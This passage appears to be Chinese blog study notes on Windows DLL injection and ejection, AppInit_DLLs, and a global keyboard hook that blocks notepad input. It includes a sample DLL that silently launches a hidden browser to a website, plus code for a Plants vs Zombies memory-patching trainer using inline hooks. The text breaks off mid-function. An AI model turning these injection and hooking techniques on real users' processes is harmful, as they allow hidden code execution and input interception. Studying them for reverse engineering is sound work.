//获取加载到EjectDll.exe进程的kernel32.FreeLibrary地址（这个地址在所有进程中是一样的） hModule = GetModuleHandle(L&quot;kernel32.dll&quot;); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;FreeLibrary&quot;); //在目标进程中运行线程，pThreadProc是FreeLibrary地址，me.modBaseAddr是要卸载的DLL的加载地址 hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); CloseHandle(hSnapshot); return TRUE; } int _tmain(int argc, TCHAR* argv[]){ DWORD dwPID &#x3D; 0xFFFFFFFF; // find process dwPID = FindProcessID(DEF_PROC_NAME); if( dwPID == 0xFFFFFFFF ) &#123; _tprintf(L&quot;There is no &lt;%s&gt; process!\\n&quot;, DEF_PROC_NAME); return 1; &#125; _tprintf(L&quot;PID of \\&quot;%s\\&quot; is %d\\n&quot;, DEF_PROC_NAME, dwPID); // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // eject dll if( EjectDll(dwPID, DEF_DLL_NAME) ) _tprintf(L&quot;EjectDll(%d, \\&quot;%s\\&quot;) success!!!\\n&quot;, dwPID, DEF_DLL_NAME); else _tprintf(L&quot;EjectDll(%d, \\&quot;%s\\&quot;) failed!!!\\n&quot;, dwPID, DEF_DLL_NAME); return 0; } 获取进程中加载的DLL信息。 hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);&#x2F;&#x2F;使用 Create Toolhelp32Snapshot0 API 可以获取加载到进程的模块（ DLL ）信息。&#x2F;&#x2F;将获取的 hSnapshot 句柄传递给Module32First(Module32NextO函数后，&#x2F;&#x2F;即可设置与MODULEENTRY32结构体相关的模块信息. 获取目标进程的句柄。 hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)&#x2F;&#x2F;使用pid获取目标进程的进程句柄 获取FreeLibrary API地址 hModule &#x3D; GetModuleHandle(L”kernel32.dll”); pThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, “FreeLibrary”); &#x2F;&#x2F;若要驱使 notepad 进程自己调用 FreeLibrary API ，需要先得到 FreeLibrary的地址。 &#x2F;&#x2F;然而代码获取的不是加载到 notepad.exe 进程中的Kernel32!FreeLibrary 地址，&#x2F;&#x2F; 而是加载到 EjectDl . exei 程中的Kernel32! FreeLibrary 地址。 在目标进程中运行线程 hThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL);&#x2F;&#x2F;pThreadProc 参数是 FreeLibrary API 的地址,&#x2F;&#x2F;me.modBaseAddr 参数是要卸载的 DLL 的加载地址。&#x2F;&#x2F;将线程函数指定为 FreeLibrary 函数，并把 DLL 加载地址传递给线程参数，&#x2F;&#x2F;就在目称世中成功调用了 FreeLibraryO ) API 。 五、AppInit_DLLss 计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows 填入dll文件路径 修改LoadAppInit_DLLs 重启系统使修改生效，使用火绒剑，process explorer查看是否注入成功。可以看见已经被注注入成功了。并且是注入了所有加载了user32.dll的进程。但是由于此dll的目标是notepad.exe进程，所以只要当运行这个exe之后才会有所动作。 myhack2.dll的源码比较简单。主要目的为加载进程为notepad.exe的程序，然后隐藏并连接指定网站。 &#x2F;&#x2F; myhack2.cpp #include “windows.h”#include “tchar.h” #define DEF_CMD L”c:\\Program Files\\Internet Explorer\\iexplore.exe”#define DEF_ADDR L”http://www.naver.com“#define DEF_DST_PROC L”notepad.exe” BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){ TCHAR szCmd[MAX_PATH] &#x3D; {0,}; TCHAR szPath[MAX_PATH] &#x3D; {0,}; TCHAR *p &#x3D; NULL; STARTUPINFO si &#x3D; {0,}; PROCESS_INFORMATION pi &#x3D; {0,}; si.cb = sizeof(STARTUPINFO); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH : if( !GetModuleFileName( NULL, szPath, MAX_PATH ) ) break; if( !(p = _tcsrchr(szPath, &#39;\\\\&#39;)) ) break; if( _tcsicmp(p+1, DEF_DST_PROC) ) break; wsprintf(szCmd, L&quot;%s %s&quot;, DEF_CMD, DEF_ADDR); if( !CreateProcess(NULL, (LPTSTR)(LPCTSTR)szCmd, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;si, &amp;pi) ) break; if( pi.hProcess != NULL ) CloseHandle(pi.hProcess); break; &#125; return TRUE; } 六、SetWindowsHooKEX（） 钩子过程（hook procedure）是系统调用的回调函数。 安装钩子时，钩子过程需要在DLL内部，该DLL的示例句柄（instance handle）即hMod。 线程ID如果为0，则钩子为“全局钩子”。 用SetWindowsHookEx()设置好钩子后，在某个进程中生成指定消息时，操作系统会将相关DLL文件强制注入相应进程。 HHOOK SetWindowsHookEx( int idHook, &#x2F;&#x2F; 钩子的类型，即它处理的消息类型 HOOKPROC lpfn, &#x2F;&#x2F;钩子子程的地址指针。如果dwThreadId参数为0 &#x2F;&#x2F; 或是一个由别的进程创建的线程的标识， &#x2F;&#x2F; lpfn必须指向DLL中的钩子子程。 &#x2F;&#x2F; 除此以外，lpfn可以指向当前进程的一段钩子子程代码。 &#x2F;&#x2F;钩子函数的入口地址，当钩子钩到任何消息后便调用这个函数。 HINSTANCE hMod, &#x2F;&#x2F;应用程序实例的句柄。标识包含lpfn所指的子程的DLL。 &#x2F;&#x2F; 如果dwThreadId 标识当前进程创建的一个线程， &#x2F;&#x2F; 而且子程代码位于当前进程，hMod必须为NULL。 &#x2F;&#x2F; 可以很简单的设定其为本应用程序的实例句柄。 DWORD dwThreadId &#x2F;&#x2F;与安装的钩子子程相关联的线程的标识符。 &#x2F;&#x2F; 如果为0，钩子子程与所有的线程关联，即为全局钩子。 ); 6.1、效果示意 首先运行HookMain.exe 再运行notepad.exe，之后再使用查看，发现dll文件已经被注入。 输入q，拆除钩子。拆除后，dll文件消失，可以正常输入。 6.2、分析源码 HookMain.exe主要过程为：首先加载KeyHook.dll文件，然后调用HookStart()函数开始钩取，用户输入”q”时，调用HookStop()函数终止钩取。 &#x2F;&#x2F;HookMain.exe #include “stdio.h”#include “conio.h”#include “windows.h” #define DEF_DLL_NAME “KeyHook.dll”#define DEF_HOOKSTART “HookStart”#define DEF_HOOKSTOP “HookStop” typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)(); void main(){ HMODULE hDll &#x3D; NULL; PFN_HOOKSTART HookStart &#x3D; NULL; PFN_HOOKSTOP HookStop &#x3D; NULL; char ch &#x3D; 0; // 加载KeyHook.dll hDll = LoadLibraryA(DEF_DLL_NAME); if( hDll == NULL ) &#123; printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError()); return; &#125; // 获取导出函数地址 HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART); HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP); // 开始 HookStart(); // “q”退出 printf(&quot;press &#39;q&#39; to quit!\\n&quot;); while( _getch() != &#39;q&#39; ) ; // 结束 HookStop(); // 卸载 KeyHook.dll FreeLibrary(hDll); } KeyHook.dll在调用HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链。 安装好键盘“钩子”后，无论哪个进程，只要发生键盘输人事件， OS 就会强制将 KeyHook . dl 人相应进程。加载了 KeyHook.dll 的进程中，发生键盘事件时会首先调用执行KeyHookKeyboardProc 。 KeyboardProc 函数中发生键盘输入事件时，就会比较当前进程的名称与“ notepad.exe ”字符串，若相同，则返回1，终止 KeyboardProc（）函数，这意味着截获且删除消息。这样，键盘消息就不会传递到 notepad.exe 程序的消息队列。 安装好键盘“钩子”后，无论哪个进程，只要发生键盘输人事件， OS 就会强制将 KeyHook . dl 人相应进程。加载了 KcyHook . dll 的进程中，发生键盘事件时会首先调用执行 KeyHfookKeyboardProc 。 KeyboardProd 函数中发生键盘输人事件时，就会比较当前进程的名称与“ notepad . exe ”字符串，若相同，则返网1，终止 KcyboardProc （函数，这意味着截获且删除消息。这样，键盘消息就环会传透到 notapadexe 程序的消息队列。notepad.exe 未能接收到任何键盘消息，故无法输出。 除此之外（即当前进程名称非“ notepad . exe ”时），执行 return CallNextHookEx ( g_hHook , nCode , wParam, lParam)，消息会被传递到另一个应用程序或钩链的另一个“钩子”函数。 &#x2F;&#x2F; KeyHook.dll #include “stdio.h”#include “windows.h” #define DEF_PROCESS_NAME “notepad.exe” HINSTANCE g_hInstance &#x3D; NULL;HHOOK g_hHook &#x3D; NULL;HWND g_hWnd &#x3D; NULL; BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved){ switch( dwReason ) { case DLL_PROCESS_ATTACH: g_hInstance &#x3D; hinstDLL; break; case DLL_PROCESS_DETACH: break; &#125; return TRUE; } LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){ char szPath[MAX_PATH] &#x3D; {0,}; char *p &#x3D; NULL; if( nCode &gt;= 0 ) &#123; // bit 31 : 0 =&gt; press, 1 =&gt; release if( !(lParam &amp; 0x80000000) ) //释放键盘按键时 &#123; GetModuleFileNameA(NULL, szPath, MAX_PATH); p = strrchr(szPath, &#39;\\\\&#39;); // 比较当前进程名称，如果是 notepad.exe 则消息不会传给应用程序 if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) return 1; &#125; &#125; //反之，调用 CallNextHookEx() 消息传给应用程序 return CallNextHookEx(g_hHook, nCode, wParam, lParam); } #ifdef __cplusplusextern “C” {#endif __declspec(dllexport) void HookStart(){ g_hHook &#x3D; SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); } __declspec(dllexport) void HookStop() { if( g_hHook ) { UnhookWindowsHookEx(g_hHook); g_hHook &#x3D; NULL; } }#ifdef __cplusplus}#endif 6.3、调试方法 先调试HookMain().exe，OD打开该程序。 查找核心代码 1、逐行跟踪调试2、检索相关API3、搜索相关字符串 由于之前打开过此程序，所以直接搜索”press ‘q’ to quit!\\n”。 点击后跳转到该位置，在401000地址处下断点。然后运行到此处。 先在401006地址处调用LoadLibrary,然后由40104B地址处的CALL指令调用KeyHook.HookStart()函数。 F7跟踪进入。 图中的代码是被加载到HookMain.exe 进程中的 KeyHook.dll的HookStart()函数。 在100010EF地址处可以看到 CALL SetWindowsHookExW() 指令，其上方10010E8与100010ED地址处的2条 PUSH 指令用于把 SetWindowsHookExW() API 的第1、2两个参数压入栈。 Set WindowsHookExW() API 的第一个参数（ idHook）值为WH_KEYBOARD(2)，第二个参数( Ipfn ）值为10001020，该值即是钩子过程的地址。后面调试 KeyHook . dlI 时再仔细看该地址。HookMain.exe的main()函数（401000）的其余代码接收到用户输人的“ q ”命令后终止钩取。 调试KeyHook.dll 使用OD打开notepad.exe,F9运行 在OD中设置如下的选项 运行HookMain.exe 随后在notepad中随意输入一个字母，此时dll被加载到10000000处 根据系统环境不同，有时不会先显示 KeyHook.dll，而是先加載其他 DLL 库。 此时按（F9）运行键，直到KeyHook.dll加载完成。 有些系统无法正常运行该功能，此时使用OllyDbg2.0即可保证运行顺畅。 点击dll跳转到KeyHook.dll的EP地址处。并且由于之前在调试HookMain.exe时候已经知道钩子的地址是10001020，所以直接在此处下断点。 下好断点好，再重新运行一下程序。然后在记事本当中尝试输入数据，记事本无接收数据的意向，并且OD已经跳转到断点处。 1、OD运行notepad.exe2、开启Break on new module(中断于新模块)选项3、运行HookMain.exe4、进行键盘输入，触发键盘消息事件5、dll被注入6、OD中设置钩子进程（KeyboardProc）断点","categories":[],"tags":[]},{"title":"植物大战僵尸修改器制作","slug":"植物大战僵尸修改器制作","date":"2022-11-17T16:01:03.000Z","updated":"2023-12-02T12:31:03.882Z","comments":true,"path":"2022/11/18/植物大战僵尸修改器制作/","link":"","permalink":"http://example.com/2022/11/18/%E6%A4%8D%E7%89%A9%E5%A4%A7%E6%88%98%E5%83%B5%E5%B0%B8%E4%BF%AE%E6%94%B9%E5%99%A8%E5%88%B6%E4%BD%9C/","excerpt":"基址偏移表部分参考: 公布我所找到的所有基址及各种功能实现方法 12345678910111213141516基址 0x00355E0C阳光 +868 +5578金钱 +950 +50花肥 +950 +220巧克力 +950 +250树肥 +950 +258树高 +950 +11C杀虫剂 +950 +224卡槽数 +868 +15C +24卡槽栏 +868 +15C +5C 此后每个植物栏相隔0x50植物当前冷却值 +868 +15C +4C 此后每个植物冷却相隔0x50植物冷却值上限 +868 +15C +50 此后每个植物冷却上限相隔0x50植物当前数量 +868 +D4植物种植函数EBP +868僵尸当前数量 +868 +B8僵尸种植函数EBP +868 +178","text":"基址偏移表部分参考: 公布我所找到的所有基址及各种功能实现方法 12345678910111213141516基址 0x00355E0C阳光 +868 +5578金钱 +950 +50花肥 +950 +220巧克力 +950 +250树肥 +950 +258树高 +950 +11C杀虫剂 +950 +224卡槽数 +868 +15C +24卡槽栏 +868 +15C +5C 此后每个植物栏相隔0x50植物当前冷却值 +868 +15C +4C 此后每个植物冷却相隔0x50植物冷却值上限 +868 +15C +50 此后每个植物冷却上限相隔0x50植物当前数量 +868 +D4植物种植函数EBP +868僵尸当前数量 +868 +B8僵尸种植函数EBP +868 +178 常规项目根据变量的变化使用CE寻找,找到之后再通过指针扫描寻找可用的基址 阳光 内存实际值&#x3D;游戏显示值 智慧树高度 内存实际值&#x3D;游戏显示值 金钱 内存实际值&#x3D;游戏显示值&#x2F;10 花肥,杀虫剂,巧克力,树肥 内存实际值&#x3D;游戏显示值+1000 关键函数和变量 复制代码 隐藏代码enum Type { Sunlight, Money, TreeHeight, Chocolate, TreeFood, FlowerFood, Insecticide}; &#x2F;&#x2F;定义映射表用于保存各项偏移值unsigned int offsetTable[10] &#x3D; { 0x5578,0x50,0x11c,0x250,0x258,0x220,0x224 }; &#x2F;&#x2F;获取某些项目的值unsigned int getSomething(HANDLE handle, DWORD BaseAddr,unsigned int type) { unsigned int num &#x3D; 0; DWORD addr &#x3D; BaseAddr + 0x00355E0C; ReadProcessMemory(handle, addr, &amp;addr, sizeof(DWORD), NULL); if (type &#x3D;&#x3D; Sunlight) addr +&#x3D; 0x868; else addr +&#x3D; 0x950; ReadProcessMemory(handle, (LPVOID)addr, &amp;addr, sizeof(DWORD), NULL); addr +&#x3D; offsetTable[type]; ReadProcessMemory(handle, (LPVOID)addr, &amp;num, sizeof(DWORD), 0); return num;} &#x2F;&#x2F;设置某些项目的值void setSomething(HANDLE handle, DWORD BaseAddr,unsigned int type, unsigned int num) { DWORD addr &#x3D; BaseAddr + 0x00355E0C; ReadProcessMemory(handle, addr, &amp;addr, sizeof(DWORD), NULL); if (type &#x3D;&#x3D; Sunlight) addr +&#x3D; 0x868; else addr +&#x3D; 0x950; ReadProcessMemory(handle, (LPVOID)addr, &amp;addr, sizeof(DWORD), NULL); addr +&#x3D; offsetTable[type]; WriteProcessMemory(handle, (LPVOID)addr, &amp;num, sizeof(DWORD), 0);}卡槽植物十个卡槽,每个卡槽对应一个植物,可以在坚果保龄球2中根据卡槽1(最左边的卡槽)的坚果变化来找到卡槽的地址,之后再寻找基址 具体方法: 初值未知,如果卡槽1的植物和新的卡槽1(原卡槽2)的植物相同,则扫不变的值,否则扫变化的值 卡槽之间的偏移可以通过浏览卡槽1内存区域看出,为0x50 坚果植物卡槽编号: 普通坚果 3 爆炸坚果 49 巨型坚果 50 设置卡槽植物函数 复制代码 隐藏代码&#x2F;&#x2F;设置卡槽植物BOOL SetPlantCard(HANDLE hProcess,DWORD BaseAddr,DWORD nCard,DWORD plantType) { DWORD cardAddr &#x3D; BaseAddr + 0x355E0C; ReadProcessMemory(hProcess, cardAddr, &amp;cardAddr, sizeof(DWORD), NULL); cardAddr +&#x3D; 0x868; ReadProcessMemory(hProcess, cardAddr, &amp;cardAddr, sizeof(DWORD), NULL); cardAddr +&#x3D; 0x15C; ReadProcessMemory(hProcess, cardAddr, &amp;cardAddr, sizeof(DWORD), NULL); cardAddr +&#x3D; 0x5C+nCard*0x50;&#x2F;&#x2F;卡槽偏移 return WriteProcessMemory(hProcess, cardAddr, &amp;plantType, sizeof(DWORD), NULL);}种植无冷却具体方法: 仅针对一个卡槽,初始值未知,种植后持续变化,冷却完毕后不变,反复扫描并查找基址,查看对应内存区域再对照植物编号可以发现卡槽间的偏移为0x50 冷却特点: 可种植状态冷却值为0,种植后冷却值持续增长,到达冷却上限后,冷却值清零,植物重新可种植 注意: 直接将冷却值置0会导致无法种植 修改方法: 修改冷却结束后恢复的速度,将inc指令修改为mov一个较大值 这个直接跳转到冷却值和冷却上限比较成功的函数以方法2为例 7E 16 对应汇编指令为 jle 0x18 修改为jmp $+2 即 eb 00 (相对当前指令2字节后的指令) 直接执行冷却值达到冷却上限后的函数(冷却值清零,植物冷却完毕可种植) 附上汇编代码转换网站 关键代码 复制代码 隐藏代码&#x2F;&#x2F;修改进程代码区代码 参数: 进程句柄 修改代码起始地址 硬编码指针 代码字节数BOOL WriteProcessCodeMemory(HANDLE hProcess, LPVOID lpStartAddress, LPCVOID lpBuffer, SIZE_T nSize) { DWORD dwOldProtect; &#x2F;&#x2F;取消页保护 if (!VirtualProtectEx(hProcess, lpStartAddress, nSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) { return FALSE; } BOOL bResult &#x3D; WriteProcessMemory(hProcess, lpStartAddress, lpBuffer, nSize, NULL);&#x2F;&#x2F;写入代码 VirtualProtectEx(hProcess, lpStartAddress, nSize, dwOldProtect, &amp;dwOldProtect);&#x2F;&#x2F;开启页保护 return bResult;} &#x2F;&#x2F;无限冷却BOOL Uncooled(HANDLE hProcess, DWORD BaseAddr) { unsigned char code[2] &#x3D; { 0xeb,0x00 }; return WriteProcessCodeMemory(hProcess, BaseAddr + 0x9ce02, code, 2);&#x2F;&#x2F;jle 0x18修改为jmp $+2} &#x2F;&#x2F;恢复冷却BOOL RecoveryCooling(HANDLE hProcess, DWORD BaseAddr) { unsigned char OriginalCode[2] &#x3D; { 0x7E ,0x16 };&#x2F;&#x2F;jmp $+2恢复为jle 0x18 return WriteProcessCodeMemory(hProcess, BaseAddr + 0x9ce02, OriginalCode, 2);}无限阳光前文已经给出了阳光的地址 基址为0x355E0C 偏移+868 +5578 查找对阳光修改的代码即可 阳光减少代码 阳光增加代码 基本过程: 设置阳光值为9999 修改阳光减少代码使得种植物不消耗阳光 修改阳光增加代码使得阳光不变化(防止阳光过多导致溢出) 复制代码 隐藏代码&#x2F;&#x2F;修改进程代码区代码 参数: 进程句柄 修改代码起始地址 硬编码指针 代码字节数BOOL WriteProcessCodeMemory(HANDLE hProcess, LPVOID lpStartAddress, LPCVOID lpBuffer, SIZE_T nSize) { DWORD dwOldProtect; &#x2F;&#x2F;取消页保护 if (!VirtualProtectEx(hProcess, lpStartAddress, nSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) { return FALSE; } BOOL bResult &#x3D; WriteProcessMemory(hProcess, lpStartAddress, lpBuffer, nSize, NULL);&#x2F;&#x2F;写入代码 VirtualProtectEx(hProcess, lpStartAddress, nSize, dwOldProtect, &amp;dwOldProtect);&#x2F;&#x2F;开启页保护 return bResult;}&#x2F;&#x2F;无限阳光,锁定阳光为9999BOOL UnlimitedSun(HANDLE hProcess, DWORD BaseAddr) { unsigned char Code[3] &#x3D; { 0x29,0xdb,0 };&#x2F;&#x2F;cmp ebx,eax 修改为sub ebx,ebx and ecx,0x32修改为and ecx,0 BOOL flag; flag &#x3D; setSomething(hProcess, BaseAddr, Sunlight, 9999);&#x2F;&#x2F;修改阳光 flag &amp;&#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x27690, Code, 2);&#x2F;&#x2F;修改阳光减少代码 flag &amp;&#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x3C0AB, &amp;Code[2], 1);&#x2F;&#x2F;修改阳光增加代码 return flag;} &#x2F;&#x2F;恢复阳光消耗BOOL RecoverySunConsume(HANDLE hProcess, DWORD BaseAddr) { unsigned char OriginalCode[3] &#x3D; { 0x3B,0xD8,0x32 };&#x2F;&#x2F;sub ebx,ebx恢复为cmp ebx,eax and ecx,0恢复为and ecx,0x32 BOOL flag &#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x27690, OriginalCode, 2);&#x2F;&#x2F;恢复阳光减少代码 flag &amp;&#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x3C0AB, &amp;OriginalCode[2], 1);&#x2F;&#x2F;恢复阳光增加代码 return flag;}浓雾透视基本原理具体方法: 在生存模式浓雾进行,初值未知,通过在雾区种植和铲除路灯花引起的变化来判断,最终可以发现是4字节数据,数值代表雾的浓度,255代表浓雾,0代表没雾,再查找修改雾值的代码 寻找浓雾地址 浓雾修改代码 mov [ecx],edx这行代码修改了雾值,可以改为mov [ecx],0 注意硬编码为0xc7,0x01,0x00,0x00,0x00,0x00 由于较长无法直接修改代码,所以这里选择使用hook技术 HOOKhook的基本过程 读取并保存目的地址原始代码申请空间(PVZ游戏进程空间)用于存储原始代码 hook代码 jmp返回代码向申请的空间中写入原始代码 hook代码 jmp返回代码修改目的地址的代码为jmp HookCode返回HookCode首地址 用于解除hook值得一提的是jmp指令后跟的偏移值是以jmp的下一条指令首地址计算 jmp指令偏移值&#x3D;目的地址-(jmp指令首地址+5) 这里的5是jmp指令本身的长度 +5便是下一条指令 offset&#x3D;desAddr-(jmpAddr+5) 复制代码 隐藏代码&#x2F;&#x2F;修改进程代码区代码 参数: 进程句柄 修改代码起始地址 硬编码指针 代码字节数BOOL WriteProcessCodeMemory(HANDLE hProcess, LPVOID lpStartAddress, LPCVOID lpBuffer, SIZE_T nSize) { DWORD dwOldProtect; &#x2F;&#x2F;取消页保护 if (!VirtualProtectEx(hProcess, lpStartAddress, nSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) { return FALSE; } BOOL bResult &#x3D; WriteProcessMemory(hProcess, lpStartAddress, lpBuffer, nSize, NULL);&#x2F;&#x2F;写入代码 VirtualProtectEx(hProcess, lpStartAddress, nSize, dwOldProtect, &amp;dwOldProtect);&#x2F;&#x2F;开启页保护 return bResult;} &#x2F;&#x2F;hook指定地址,申请新空间保存原始代码并写入hookcode,返回申请空间的地址LPVOID SetHook(HANDLE hProcess, LPVOID desAddr, LPCVOID hookCode, SIZE_T hookCodeSize, SIZE_T origCodeSize) { BYTE origCode[10] &#x3D; { 0 }, jmpCode[5] &#x3D; { 0xE9,0,0,0,0 }; &#x2F;&#x2F;1. 读取并保存原始代码 if (!ReadProcessMemory(hProcess, desAddr, origCode, origCodeSize, NULL)) return NULL; //2. 申请空间用于存储原始代码,hook代码,jmp返回代码 LPVOID allocAddr = VirtualAllocEx(hProcess, NULL, hookCodeSize + origCodeSize + 5, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!allocAddr) return NULL; //3. 向申请空间写入原始代码,hook代码,jmp返回代码 jmp xxx 偏移为目的地址-jmp下一条指令地址 *(DWORD*)(jmpCode + 1) = (DWORD)desAddr + 5 - ((DWORD)allocAddr + hookCodeSize + origCodeSize + 5);//hook返回地址的偏移 if (!WriteProcessCodeMemory(hProcess, allocAddr, origCode, origCodeSize) //写入原始代码 || !WriteProcessCodeMemory(hProcess, (DWORD)allocAddr + origCodeSize, hookCode, hookCodeSize)//写入hook代码 || !WriteProcessCodeMemory(hProcess, (DWORD)allocAddr + origCodeSize + hookCodeSize, jmpCode, 5))//写入jmpcode &#123; VirtualFreeEx(hProcess, allocAddr, 0, MEM_RELEASE);//写入失败则释放空间 return NULL; &#125; //4. 修改目的地址处的代码 jmp xxx偏移 原始代码后才是需要执行的hook代码 *(DWORD*)(jmpCode + 1) = ((DWORD)allocAddr + origCodeSize) - ((DWORD)desAddr + 5); WriteProcessCodeMemory(hProcess, desAddr, jmpCode, 5);//在源地址处写入跳转代码 if (origCodeSize &gt; 5)//原始代码长度大于5时nop多余字节 &#123; BYTE nopCode[5] = &#123; 0x90,0x90,0x90,0x90,0x90 &#125;; if (!WriteProcessCodeMemory(hProcess, (DWORD)desAddr + 5, nopCode, origCodeSize - 5)) &#123; VirtualFreeEx(hProcess, allocAddr, 0, MEM_RELEASE);//写入nopcode失败则释放空间并返回 return NULL; &#125; &#125; //5. hook成功则返回hookCode所在地址 return allocAddr; } &#x2F;&#x2F;取消hook指定地址,写回原始代码并释放申请空间BOOL UnHook(HANDLE hProcess, LPVOID desAddr, SIZE_T origCodeSize, LPVOID allocAddr) { BYTE origCode[10] &#x3D; { 0 }; &#x2F;&#x2F;1. 从申请空间中读出原始代码 if (!ReadProcessMemory(hProcess, allocAddr, origCode, origCodeSize, NULL)) return FALSE; &#x2F;&#x2F;2. 将原始代码写回目的地址 if (!WriteProcessCodeMemory(hProcess, desAddr, origCode, origCodeSize)) return FALSE; &#x2F;&#x2F;3. 释放申请空间 if (!VirtualFreeEx(hProcess, allocAddr, 0, MEM_RELEASE)) return FALSE; return TRUE;}除雾代码 复制代码 隐藏代码&#x2F;&#x2F;除雾 注意保留hook代码首地址LPVOID DeFogByHook(HANDLE hProcess, LPVOID BaseAddr) { unsigned char hookCode[9] = &#123; 0xc7,0x01,0x00,0x00,0x00,0x00, //mov [ecx],0 0x83,0xc1,0x04 //add ecx,0x4 &#125;; //写入hook代码进行hook return SetHook(hProcess, (DWORD)BaseAddr + 0x26173, hookCode, sizeof(hookCode), 5); } &#x2F;&#x2F;恢复雾BOOL RecoveryFogByUnHook(HANDLE hProcess, LPVOID BaseAddr, LPVOID allocAddr) { return UnHook(hProcess, (DWORD)BaseAddr + 0x26173, 5, allocAddr);}hook前 指令为mov [ecx],edx add ecx,04 hook后 指令被修改为jmp hookcode 新分配空间前5个字节正是原始代码 之后是hook代码和jmp返回代码 种植植物基本原理程序是执行种植植物的函数后再执行增加植物数量的功能 首先查找草坪上的植物数量,初值0,随着种植个数增加 基址0x355E0C 偏移+868 +D4 再查找是什么修改了植物数量,下断点之后再种植一个植物 断下后查看调用堆栈中的返回地址,即可找到种植函数 ![9.1 找到种植call函数](9.1 找到种植call函数.png) 这个功能最初使用远程线程注入dll来实现,注入dll虽然比较简单但是却并不通用,在此仅做介绍,比较推荐使用远程代码注入的方式实现 远程线程注入dll函数远程线程是当前进程在目标进程中创建一个线程并执行特定代码(这段代码必须在目标进程中而不是当前进程中) 注入dll是因为dll在被进程或线程加载时执行dll的DllMain函数,通过这一特点我们可以实现一些特殊功能 优点: 便于实现 缺点: dll注入容易被检测到 基本过程: 打开进程获取进程句柄在目标进程中申请空间用于存储dll路径名将dll路径名写入申请的空间中创建远程线程,执行LoadLibrary函数(加载dll)目标进程加载dll后自动执行dll的DllMain函数 复制代码 隐藏代码&#x2F;&#x2F;创建远程线程方式向指定进程注入dllBOOL InjectDllByRemoteThread(DWORD desProcId,WCHAR* dllPath) { &#x2F;&#x2F;打开进程获取进程句柄 HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, desProcId); if (!hProcess) return FALSE; //申请空间 DWORD pathSize = (wcslen(dllPath) + 1) * 2; LPVOID newMemAddr = VirtualAllocEx(hProcess, 0, pathSize, MEM_COMMIT, PAGE_READWRITE); if (!newMemAddr) return FALSE; //写入dll路径 if (!WriteProcessMemory(hProcess, newMemAddr, dllPath, pathSize, NULL)) &#123; VirtualFreeEx(hProcess, newMemAddr, 0, MEM_RELEASE); return FALSE; &#125; //创建远程线程 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, newMemAddr, 0, NULL); if (!hThread) &#123; VirtualFreeEx(hProcess, newMemAddr, 0, MEM_RELEASE); return FALSE; &#125; WaitForSingleObject(hThread, INFINITE);//等待线程信号,保证成功注入 //回收资源 VirtualFreeEx(hProcess, newMemAddr, 0, MEM_RELEASE); CloseHandle(hThread); CloseHandle(hProcess); //返回成功 return TRUE; }远程线程卸载dll函数很多教程只给出了如何注入dll,没有演示如何卸载 如果只注入不卸载会导致下次再注入时不会执行特定函数(由于dll已经被加载过) 不方便实时调试更新dll等问题 基本过程: 在目标进程申请内存,将需要卸载的dll模块名称写入该内存通过枚举模块来查找指定模块成功查找到dll模块则创建远程线程执行FreeLibrary函数卸载dll 复制代码 隐藏代码BOOL UnLoadDllByRemoteThread(DWORD dwProcessId, LPCWSTR lpDllName){ HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess &#x3D;&#x3D; NULL) return FALSE; // 在目标进程中申请一块内存，并将需要卸载的DLL模块的名称写入该内存 LPVOID lpRemoteDllName = VirtualAllocEx(hProcess, NULL, (wcslen(lpDllName) + 1) * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (lpRemoteDllName == NULL) &#123; CloseHandle(hProcess); return FALSE; &#125; if (!WriteProcessMemory(hProcess, lpRemoteDllName, lpDllName, (wcslen(lpDllName) + 1) * sizeof(WCHAR), NULL)) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; //查找dll模块 HMODULE hModules[1024],DesModule=NULL; DWORD dwSize = 0; if (!EnumProcessModules(hProcess, hModules, sizeof(hModules), &amp;dwSize)) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; // 遍历模块列表，查找需要卸载的DLL模块 for (DWORD i 